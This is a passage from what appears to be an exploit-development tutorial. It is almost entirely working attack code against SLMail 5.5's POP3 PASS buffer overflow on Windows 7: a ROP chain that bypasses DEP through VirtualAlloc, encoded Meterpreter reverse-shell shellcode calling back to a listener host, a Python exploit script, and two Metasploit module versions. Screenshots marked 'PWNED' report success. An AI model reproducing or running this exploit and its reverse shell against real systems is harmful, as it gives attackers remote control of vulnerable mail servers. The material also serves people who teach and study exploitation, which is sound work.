                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFF001,      # -0xFFF  (-0x1000 contains null bytes)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4235b6,       # INC EAX # RETN (0xFFF + 1 = 0x1000)
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # flProtect (0x40)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFFC0,      # -0x40 
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # Make ESP point to VirtualAlloc pointer on stack and RET
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFFEC,      # -0x14 (value to substract to ECX)
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN (move ecx to edi)
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (On eax is the pointer to VirtualAlloc)
                  0x41414141,      # Filler to POP EDI
                  0x5f452c0f,        # XCHG EAX,ESP # RETN
                ]
                return ''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.178 LPORT=6969 EXITFUNC=thread -b \x00\x0a\x0d -f c
# x86/shikata_ga_nai succeeded with size 347 (iteration=0)
shellcode = (
\xdb\xcf\xb8\xb3\x6a\x92\x42\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1
\x51\x31\x42\x17\x03\x42\x17\x83\x71\x6e\x70\xb7\x89\x87\xf6
\x38\x71\x58\x97\xb1\x94\x69\x97\xa6\xdd\xda\x27\xac\xb3\xd6
\xcc\xe0\x27\x6c\xa0\x2c\x48\xc5\x0f\x0b\x67\xd6\x3c\x6f\xe6
\x54\x3f\xbc\xc8\x65\xf0\xb1\x09\xa1\xed\x38\x5b\x7a\x79\xee
\x4b\x0f\x37\x33\xe0\x43\xd9\x33\x15\x13\xd8\x12\x88\x2f\x83
\xb4\x2b\xe3\xbf\xfc\x33\xe0\xfa\xb7\xc8\xd2\x71\x46\x18\x2b
\x79\xe5\x65\x83\x88\xF7\xa2\x24\x73\x82\xda\x56\x0e\x95\x19
\x24\xd4\x10\xb9\x8e\x9f\x83\x65\x2e\x73\x55\xee\x3c\x38\x11
\xa8\x20\xbf\xf6\xc3\x5d\x34\xf9\x03\xd4\x0e\xde\x87\xbc\xd5
\x7f\x9e\x18\xbb\x80\xc0\xc2\x64\x25\x8b\xef\x71\x54\xd6\x67
\xb5\x55\xe8\x77\xd1\xee\x9b\x45\x7e\x45\x33\xe6\xF7\x43\xc4
\x09\x22\x33\x5a\xf4\xcd\x44\x73\x33\x99\x14\xeb\x92\xa2\xfe
\xeb\x1b\x77\x50\xbb\xb3\x28\x11\x6b\x74\x99\xf9\x61\x7b\xc6
\x1a\x8a\x51\x6f\xb0\x71\x32\x50\xed\x38\x70\x38\xec\xba\x6f
\x80\x79\x5c\xe5\xe2\x2f\xF7\x92\x9b\x75\x83\x03\x63\xa0\xee
\x04\xef\x41\x0f\xca\x18\x23\x03\x3b\x27\xcb\xdb\xbc\x32\xcb
\xb1\xb8\x94\x9c\x2d\xc3\xc1\xeb\xf2\x3c\x24\x68\xf4\xc3\xb9
\x86\x8f\xf2\x2f\x19\xe7\xfa\xbf\x99\xF7\xac\xd5\x99\x9f\x08
\x8e\xc9\xba\x56\x1b\x7e\x17\xc3\xa4\xd7\xc4\x44\xcd\xd5\x33
\xa2\x52\x25\x16\xb0\x95\xd9\xe6\x74\x64\x19\x3f\xbd\x12\x74
\xfc\xfa\x3d\x9b\x28\xF7\xd5\x02\xb9\xba\xbb\xb4\x14\xf8\xc5
\x36\x9c\x81\x31\x26\xd5\x84\x7e\xe0\x06\xf5\xef\x85\x28\xaa
\x10\x8c
)
 
#0x5f4011f2 : # RET                          &#91;SLMFC.DLL]
EIP=struct.pack(&lt;I,0x5f4011f2)
move_esp = \x81\xc4\xc0\xfb\xff\xff # add esp,-440h
jmp_back = \xe9\x7d\xfc\xff\xff # jmp $-37E

eip_offset = 4654
shellcode_offset = 4092

shellcode_size = 562
buff_size = 6000

rop_chain = create_rop_chain()

buffer = 'A' * shellcode_offset
buffer += move_esp
buffer += shellcode
buffer += 'B' * (eip_offset - len(buffer)) # Here is where the real shellcode goes
buffer += EIP
buffer += rop_chain
buffer += jmp_back
buffer += 'C' * (buff_size - len(buffer))

print rop_chain length: +str(len(rop_chain))

HOST = '127.0.0.1'
PORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
print 'Received', repr(data)
s.send('USER username'+'\r\n')
data = s.recv(1024)
print 'Received', repr(data)
s.send('PASS ' + buffer + '\r\n')
s.close()</code></pre>



<p>We configure exploit/handler on msfconsole to get the session and execute the exploit again:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7775" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/37/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?fit=847%2C461&amp;ssl=1" data-orig-size="847,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="37" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?fit=300%2C163&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?fit=847%2C461&amp;ssl=1" loading="lazy" width="847" height="461" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?resize=847%2C461&#038;ssl=1" alt class="wp-image-7775 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?w=847&amp;ssl=1 847w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?resize=300%2C163&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?resize=768%2C418&amp;ssl=1 768w" data-lazy-sizes="(max-width: 847px) 100vw, 847px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?resize=847%2C461&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7775" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/37/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?fit=847%2C461&amp;ssl=1" data-orig-size="847,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="37" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?fit=300%2C163&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?fit=847%2C461&amp;ssl=1" loading="lazy" width="847" height="461" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?resize=847%2C461&#038;ssl=1" alt="" class="wp-image-7775" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?w=847&amp;ssl=1 847w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?resize=300%2C163&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/37.png?resize=768%2C418&amp;ssl=1 768w" sizes="(max-width: 847px) 100vw, 847px" data-recalc-dims="1" /></noscript></figure>



<p>Here is the result of the exploit execution on the Windows 7 SP1 64bit box:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7776" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/38/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?fit=994%2C389&amp;ssl=1" data-orig-size="994,389" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="38" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?fit=300%2C117&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?fit=994%2C389&amp;ssl=1" loading="lazy" width="994" height="389" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?resize=994%2C389&#038;ssl=1" alt class="wp-image-7776 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?w=994&amp;ssl=1 994w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?resize=300%2C117&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?resize=768%2C301&amp;ssl=1 768w" data-lazy-sizes="(max-width: 994px) 100vw, 994px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?resize=994%2C389&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7776" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/38/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?fit=994%2C389&amp;ssl=1" data-orig-size="994,389" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="38" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?fit=300%2C117&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?fit=994%2C389&amp;ssl=1" loading="lazy" width="994" height="389" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?resize=994%2C389&#038;ssl=1" alt="" class="wp-image-7776" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?w=994&amp;ssl=1 994w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?resize=300%2C117&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/38.png?resize=768%2C301&amp;ssl=1 768w" sizes="(max-width: 994px) 100vw, 994px" data-recalc-dims="1" /></noscript></figure>



<p>PWNED!!!! Yet again.</p>



<h2>The Metasploit version</h2>



<p>Now we are going to port our exploit to the Metasploit Framework. As a base, we are going to use the exploit skeleton from the Windows XP exploit we developed before.</p>



<p>Here is the exploit modified:</p>



<pre class="wp-block-code"><code>require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'          =&gt; 'SLMail 5.5 Pop3 Pass Exploit Module',
      'Description'   =&gt; 'This module exploits a buffer overflow when sending password to pop3 server',
      'Author'        =&gt; 'Nacho Sorribas',
      'Payload'       =&gt;
        {
          'Space' =&gt; 556,
          'BadChars' =&gt; \x00\x0a\x0d,
        },
      'Targets'       =&gt;
        &#91;
          &#91;'Windows 7 SP1 64bit Spanish',
            {
              'Ret' =&gt; 0x5f4011f2, #0x5f4011f2 : # RET                      &#91;SLMFC.DLL]
              'OffSet' =&gt; 4654,
              'ShellCode_OffSet' =&gt; 4092,
            }
          ]
        ],
      'Platform'      =&gt; 'win',
      'DefaultTarget' =&gt; 0,
      'Privileged' =&gt; false ))

    register_options( &#91; Opt::RPORT(110)], self.class)

  end

  def create_rop_chain()

    # rop chain generated by Nacho Sorribas
    rop_gadgets = &#91;
      # Put a valid pointer on EAX
      0x5f48c086,   # MOV EAX,ECX # RETN
      #--- Save ESP into ECX
      0x5f42F7dc,  
      0x41414141,  # to pop esi
      0x5f4011f2,    # RET
      0x41414141,  # compensate retn 0x04
      # Ptr to VirtualAlloc on EAX
      0x5f418fac,     # POP EAX # RETN
      0x5f49a1cc,    # PTR to kernel32.dll
      0x5f488461,   # MOV EAX,DWORD PTR DS:&#91;EAX] # RETN 0x04
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x04
      0x5f445803,   # POP EDI # RETN
      0xffffff28,        # Offset to VirtualAlloc -0xd8
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      # Save the pointer to VirtualAlloc
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # returnTo (Address where VirtualAlloc returns: must be behind the rop_chain)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFEC0,  # Value to EAX (-0x140)
      0x5f465969,   # NEG EAX # RETN
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      # Save returnTo
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # lpAddress (Address where start the DEP disabled)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFDBE, # Value to EAX (-578 bytes (0x242))
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # dwSize (0x1FF)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFE01,  # Value to EAX (-0x1FF)
      0x5f465969,   # NEG EAX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # flAllocationType (0x1000)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFF001,  # -0xFFF  (-0x1000 contains null bytes)
      0x5f465969,   # NEG EAX # RETN
      0x5f4235b6,   # INC EAX # RETN (0xFFF + 1 = 0x1000)
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # flProtect (0x40)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFFC0,  # -0x40 
      0x5f465969,   # NEG EAX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # Make ESP point to VirtualAlloc pointer on stack and RET
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFFEC,  # -0x14 (value to substract to ECX)
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN (move ecx to edi)
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (eax -&gt; ptr to VirtualAlloc)
      0x41414141,  # Filler to POP EDI
      0x5f452c0f,    # XCHG EAX,ESP # RETN
    ].flatten.pack(V*)

    return rop_gadgets

  end

  # Connect to port, send the payload, handle it, disconnect
  def exploit

    size = 6000 # buffer size
    move_esp = \x81\xc4\xc0\xfb\xff\xff # add esp,-440h
    jmp_back = \xe9\x7d\xfc\xff\xff # jmp $-37E

    buffer = A * target&#91;'ShellCode_OffSet'] # Padding
    buffer &lt;&lt; move_esp
    buffer &lt;&lt; payload.encoded
    buffer &lt;&lt; B * (target&#91;'OffSet']-buffer.length)
    buffer &lt;&lt; &#91;target.ret].pack('V') # EIP
    buffer &lt;&lt; create_rop_chain()
    buffer &lt;&lt; jmp_back
    buffer &lt;&lt; C * (size-buffer.length) # Padding to buffer size

    request = PASS +buffer+\r\n
    connect()
    sock.get
    sock.put(USER username \r\n)
    sock.get
    print_status(Sending evil buffer...)
    sock.put(request)
    handler()
    disconnect()
  end
end</code></pre>



<p>Save it as /root/.msf4/modules/exploits/windows/pop3/slmail_pass_win7.rb and launch msfconsole. Configure the module and run the exploit command:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7777" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/39/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?fit=742%2C348&amp;ssl=1" data-orig-size="742,348" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="39" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?fit=300%2C141&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?fit=742%2C348&amp;ssl=1" loading="lazy" width="742" height="348" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?resize=742%2C348&#038;ssl=1" alt class="wp-image-7777 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?w=742&amp;ssl=1 742w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?resize=300%2C141&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?resize=740%2C348&amp;ssl=1 740w" data-lazy-sizes="(max-width: 742px) 100vw, 742px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?resize=742%2C348&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7777" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/39/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?fit=742%2C348&amp;ssl=1" data-orig-size="742,348" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="39" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?fit=300%2C141&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?fit=742%2C348&amp;ssl=1" loading="lazy" width="742" height="348" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?resize=742%2C348&#038;ssl=1" alt="" class="wp-image-7777" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?w=742&amp;ssl=1 742w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?resize=300%2C141&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/39.png?resize=740%2C348&amp;ssl=1 740w" sizes="(max-width: 742px) 100vw, 742px" data-recalc-dims="1" /></noscript></figure>



<p>As we can see, the exploit is sending the stage but the Meterpreter session never comes. The problem is the way Metasploit makes the payload.</p>



<p>In this case we said that we have 556 bytes for the payload (Space variable in the payload block) and what Metasploit does is to generate the payload (around 347 bytes in this case) and fill the remaining bytes with NOPs until the final payload size is 556 bytes.</p>



<p>In the Python exploit we used “B”s as padding and the exploit was working fine.</p>



<p>Adding the parameter DisableNops =&gt; True to the payload block of the exploit changes this behavior from Metasploit and the payload just fits its own size.</p>



<p>Once this is added to the exploit, here is the final version:</p>



<pre class="wp-block-code"><code>require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp
 
 def initialize(info = {})
    super(update_info(info,
      'Name'          =&gt; 'SLMail 5.5 Pop3 Pass Exploit Module',
      'Description'   =&gt; 'This module exploits a buffer overflow when sending password to pop3 server',
      'Author'        =&gt; 'Nacho Sorribas',
      'Payload'       =&gt;
        {
          'Space' =&gt; 556,
          'BadChars' =&gt; \x00\x0a\x0d,
          'DisableNops' =&gt; 'True',
        },
      'Targets'       =&gt;
        &#91;
          &#91;'Windows 7 SP1 64bit Spanish',
            {
              'Ret' =&gt; 0x5f4011f2, #0x5f4011f2 : # RET                      &#91;SLMFC.DLL]
              'OffSet' =&gt; 4654,
              'ShellCode_OffSet' =&gt; 4092,
            }
          ]
        ],
      'Platform'      =&gt; 'win',
      'DefaultTarget' =&gt; 0,
      'Privileged' =&gt; false ))

    register_options( &#91; Opt::RPORT(110)], self.class)

  end

  def create_rop_chain()

    # rop chain generated by Nacho Sorribas
    rop_gadgets = &#91;
      # Put a valid pointer on EAX
      0x5f48c086,   # MOV EAX,ECX # RETN
      #--- Save ESP into ECX
      0x5f42F7dc,  
      0x41414141,  # to pop esi
      0x5f4011f2,    # RET
      0x41414141,  # compensate retn 0x04
      # Ptr to VirtualAlloc on EAX
      0x5f418fac,     # POP EAX # RETN
      0x5f49a1cc,    # PTR to kernel32.dll
      0x5f488461,   # MOV EAX,DWORD PTR DS:&#91;EAX] # RETN 0x04
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x04
      0x5f445803,   # POP EDI # RETN
      0xffffff28,        # Offset to VirtualAlloc -0xd8
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      # Save the pointer to VirtualAlloc
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # returnTo (Address where VirtualAlloc returns: must be behind the rop_chain)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFEC0,  # Value to EAX (-0x140)
      0x5f465969,   # NEG EAX # RETN
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      # Save returnTo
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # lpAddress (Address where start the DEP disabled)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFDBE, # Value to EAX (-578 bytes (0x242))
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # dwSize (0x1FF)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFE01,  # Value to EAX (-0x1FF)
      0x5f465969,   # NEG EAX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # flAllocationType (0x1000)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFF001,  # -0xFFF  (-0x1000 contains null bytes)
      0x5f465969,   # NEG EAX # RETN
      0x5f4235b6,   # INC EAX # RETN (0xFFF + 1 = 0x1000)
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # flProtect (0x40)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFFC0,  # -0x40 
      0x5f465969,   # NEG EAX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # Make ESP point to VirtualAlloc pointer on stack and RET
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFFEC,  # -0x14 (value to substract to ECX)
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN (move ecx to edi)
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (eax -&gt; ptr to VirtualAlloc)
      0x41414141,  # Filler to POP EDI
      0x5f452c0f,    # XCHG EAX,ESP # RETN
    ].flatten.pack(V*)

    return rop_gadgets

  end

  # Connect to port, send the payload, handle it, disconnect
  def exploit

    size = 6000 # buffer size
    move_esp = \x81\xc4\xc0\xfb\xff\xff # add esp,-440h
    jmp_back = \xe9\x7d\xfc\xff\xff # jmp $-37E

